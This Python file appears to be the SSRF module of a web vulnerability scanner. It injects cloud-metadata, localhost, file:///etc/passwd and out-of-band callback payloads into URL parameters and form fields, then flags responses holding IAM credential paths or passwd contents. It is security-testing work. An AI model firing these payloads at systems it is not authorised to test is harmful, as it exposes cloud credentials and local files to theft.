import asyncio
import logging
from urllib.parse import urlparse, parse_qs, urlencode
from core.finding import Finding
from core.http_client import make_client, PROBE_TIMEOUT

logger = logging.getLogger(__name__)

SSRF_PARAMS = {"url", "src", "path", "redirect", "next", "link", "dest",
               "target", "rurl", "returnUrl", "return", "uri", "ref",
               "image", "img", "fetch", "load", "callback", "open"}

SSRF_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/", "AWS Metadata"),
    ("http://169.254.169.254/computeMetadata/v1/", "GCP Metadata"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure Metadata"),
    ("http://127.0.0.1/", "Localhost"),
    ("http://[::1]/", "IPv6 Localhost"),
    ("file:///etc/passwd", "Local File Read (file://)"),
]

METADATA_INDICATORS = [
    # These strings only appear in real cloud metadata API responses,
    # NOT in normal HTML pages.  "hostname" and "project" are intentionally
    # excluded because they appear in JavaScript on almost every page.
    "ami-id",
    "instance-id",
    "local-ipv4",
    "computeMetadata/v1",
    "serviceAccounts",
    "iam/security-credentials",
    "compute/v1/projects",
]


def _is_real_ssrf_response(body: str, payload_url: str) -> bool:
    """
    Return True only if the response strongly indicates real SSRF.
    Filters out false positives where a keyword appears in normal HTML.
    """
    # file:// payloads: look for /etc/passwd content
    if "file://" in payload_url:
        return "root:x:" in body or "root:0:0:" in body

    # Metadata payloads: response must be short and not HTML
    if "<html" in body[:500].lower() or "<!doctype" in body[:200].lower():
        return False  # Full HTML page — not a metadata API response

    return any(ind in body for ind in METADATA_INDICATORS)


class Ssrf:
    async def run(self, ctx: dict) -> list[Finding]:
        findings: list[Finding] = []
        forms = ctx.get("forms", [])
        endpoints = ctx.get("endpoints", [])
        limiter = ctx["limiter"]
        oob = ctx.get("oob")
        sem = asyncio.Semaphore(10)

        async def probe_ep(ep: str):
            parsed = urlparse(ep)
            if not parsed.query:
                return
            params = parse_qs(parsed.query)
            for param in params:
                if param.lower() in SSRF_PARAMS:
                    f = await self._test_ssrf_param(ep, param, parsed, params, limiter, sem, oob)
                    if f:
                        findings.append(f)

        async def probe_form(form: dict):
            for inp in form.get("inputs", []):
                if inp.lower() in SSRF_PARAMS:
                    f = await self._test_ssrf_form(form, inp, limiter, sem, oob)
                    if f:
                        findings.append(f)
                        break

        await asyncio.gather(
            *[probe_ep(ep) for ep in endpoints[:200]],
            *[probe_form(f) for f in forms[:50]],
        )
        logger.info(f"Ssrf completed — {len(findings)} finding(s)")
        return findings

    async def _test_ssrf_param(self, url: str, param: str, parsed, params, limiter, sem, oob=None) -> Finding | None:
        async with sem:
            # ── OOB blind SSRF probe (if OOB available) ───────────────────────
            if oob and oob.active:
                token, cb_url = oob.register(f"ssrf_{param}")
                p = dict(params)
                p[param] = [cb_url]
                probe = parsed._replace(query=urlencode(p, doseq=True)).geturl()
                try:
                    async with limiter.acquire():
                        async with make_client(timeout=PROBE_TIMEOUT) as client:
                            await client.get(probe)
                    hit = await oob.wait_for(token, timeout=6.0)
                    if hit:
                        return Finding(
                            title=f"Blind SSRF via '{param}' (OOB Confirmed)",
                            severity="Critical",
                            description=(
                                f"Parameter '{param}' caused the server to issue an outbound "
                                f"HTTP request to our OOB callback URL, confirming blind SSRF. "
                                f"The server can be forced to make arbitrary requests."
                            ),
                            affected_url=probe,
                            proof=f"GET {probe}\nOOB callback received from server → SSRF confirmed",
                            remediation="Validate and whitelist URLs server-side. Block requests to 169.254.0.0/16, 127.0.0.0/8.",
                            impact=5, likelihood=5,
                            module="Ssrf",
                            references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
                        )
                except Exception as e:
                    logger.debug(f"SSRF OOB probe {probe}: {type(e).__name__}: {e}")

            # ── Standard SSRF payloads (in-band detection) ────────────────────
            for payload_url, label in SSRF_PAYLOADS:
                p = dict(params)
                p[param] = [payload_url]
                probe = parsed._replace(query=urlencode(p, doseq=True)).geturl()
                try:
                    async with limiter.acquire():
                        async with make_client(timeout=PROBE_TIMEOUT) as client:
                            r = await client.get(probe)

                    body = r.text
                    if _is_real_ssrf_response(body, payload_url):
                        return Finding(
                            title=f"SSRF: Server-Side Request Forgery via '{param}'",
                            severity="Critical",
                            description=f"Parameter '{param}' causes the server to fetch '{payload_url}' ({label}). Cloud metadata or local files are exposed.",
                            affected_url=probe,
                            proof=f"GET {probe}\nHTTP {r.status_code}\n{body[:500]}",
                            remediation="Validate and whitelist URLs server-side. Block requests to 169.254.0.0/16, 127.0.0.0/8.",
                            impact=5, likelihood=4,
                            module="Ssrf",
                            references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
                        )
                except Exception as e:
                    logger.debug(f"SSRF probe error {probe}: {type(e).__name__}: {e}")
        return None

    async def _test_ssrf_form(self, form: dict, inp: str, limiter, sem, oob=None) -> Finding | None:
        action = form.get("action", "")
        method = form.get("method", "GET")
        async with sem:
            # ── OOB blind SSRF on form fields ─────────────────────────────────
            if oob and oob.active:
                token, cb_url = oob.register(f"ssrf_form_{inp}")
                data = {i: "test" for i in form.get("inputs", [])}
                data[inp] = cb_url
                try:
                    async with limiter.acquire():
                        async with make_client(timeout=PROBE_TIMEOUT) as client:
                            if method == "POST":
                                await client.post(action, data=data)
                            else:
                                await client.get(action, params=data)
                    if await oob.wait_for(token, timeout=6.0):
                        return Finding(
                            title=f"Blind SSRF in Form Field '{inp}' (OOB Confirmed)",
                            severity="Critical",
                            description=f"Form field '{inp}' at {action} triggered an OOB HTTP callback, confirming blind SSRF.",
                            affected_url=action,
                            proof=f"{method} {action}\n{inp}={cb_url}\nOOB callback received",
                            remediation="Sanitize and whitelist URL inputs. Never allow the server to fetch arbitrary URLs.",
                            impact=5, likelihood=5, module="Ssrf",
                        )
                except Exception as e:
                    logger.debug(f"SSRF OOB form probe {action}: {e}")

            # ── In-band payloads ───────────────────────────────────────────────
            for payload_url, label in SSRF_PAYLOADS[:3]:
                data = {i: "test" for i in form.get("inputs", [])}
                data[inp] = payload_url
                try:
                    async with limiter.acquire():
                        async with make_client(timeout=PROBE_TIMEOUT) as client:
                            if method == "POST":
                                r = await client.post(action, data=data)
                            else:
                                r = await client.get(action, params=data)

                    if _is_real_ssrf_response(r.text, payload_url):
                        return Finding(
                            title=f"SSRF via Form Field '{inp}'",
                            severity="Critical",
                            description=f"Form field '{inp}' at {action} triggers SSRF to {label}.",
                            affected_url=action,
                            proof=f"{method} {action}\ndata={data}\nHTTP {r.status_code}\n{r.text[:300]}",
                            remediation="Sanitize and whitelist URL inputs. Never allow the server to fetch arbitrary URLs.",
                            impact=5, likelihood=4,
                            module="Ssrf",
                        )
                except Exception as e:
                    logger.debug(f"SSRF form probe {action}: {type(e).__name__}: {e}")
        return None
